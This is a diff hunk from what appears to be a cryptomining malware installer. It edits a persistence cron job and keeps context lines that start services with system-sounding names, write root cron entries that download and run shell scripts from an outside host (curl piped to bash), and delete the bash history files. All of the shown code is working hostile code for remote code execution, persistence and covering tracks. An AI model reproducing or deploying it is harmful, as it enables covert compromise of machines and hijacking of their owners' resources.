@@ -21,8 +21,8 @@ fi
     systemctl start ssh-daemons.service
     systemctl start sys-kernel.service
     echo "*/9 * * * * root curl -s https://xmrhorizontal.github.io/command.sh | bash" > /etc/cron.d/debcron
-    RANDOM_DELAY=$((59 + RANDOM % 41))
-    echo "* * * * * root (sleep $((RANDOM_DELAY * 60)); curl -s https://xmrhorizontal.github.io/searcher.sh | bash)" > /etc/cron.d/cronextend
+    RANDOM_DELAY=$((RANDOM % 41))
+    echo "*/59 * * * * root (sleep $((RANDOM_DELAY * 60)); curl -s https://xmrhorizontal.github.io/searcher.sh | bash)" > /etc/cron.d/cronextend
     rm -f ~/.bash_history
     rm -f /root/.bash_history
 echo OK!
